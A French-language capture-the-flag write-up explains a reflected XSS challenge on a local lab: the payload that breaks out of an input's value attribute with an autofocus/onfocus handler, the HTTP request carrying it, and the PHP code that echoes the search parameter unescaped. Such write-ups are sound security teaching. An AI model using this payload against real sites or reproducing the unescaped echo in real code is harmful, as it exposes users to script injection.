# xss2

## Exploitation

Le second challenge propose une fonctionnalité de recherche :&#x20;

![](<../../../.gitbook/assets/image (1) (1) (2).png>)

Lorsque je renseigne un mot clé, il n'est pas réfléchi dans le message d'erreur mais est présent en tant que valeur du champ de recherche :&#x20;

![](<../../../.gitbook/assets/image (12) (1).png>)

`value` est un attribut HTML safe, l'injection ne peut se faire directement. Je vais donc préparer ma payload afin de m'échapper de cet attribut puis forger mon attaque. Il y a plusieurs solutions ici mais je choisis de passer par un autofocus `whatever" onfocus="alert(1)" autofocus x="` :&#x20;

```http
POST /xss2/ HTTP/1.1
Host: localhost:9003
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Content-Length: 83
Origin: http://localhost:9003
Connection: close
Referer: http://localhost:9003/xss2/
Upgrade-Insecure-Requests: 1

search=whatever%22+onfocus%3D%22alert%281%29%22+autofocus+plop%3D%22&submit=Envoyer
```

![](<../../../.gitbook/assets/image (4) (1) (4).png>)

## Analyse du code source

La valeur du paramètre `$keyword`, récupérée depuis la variable `$_POST['search']` est affichée directement grâce à la directive `echo` en tant que valeur de l'attribut HTML `value`. Aucune protection étant en place, l'injection est donc évidente :

```php
<?php
  if (isset ($_POST['submit']) && isset ($_POST['search'])) {
    $keyword = $_POST['search'];
  }
?>

<input type="text" class="form-control" id="search" name="search" value="<?php if (isset ($keyword) && !empty ($keyword)){ echo $keyword; }?>"
```
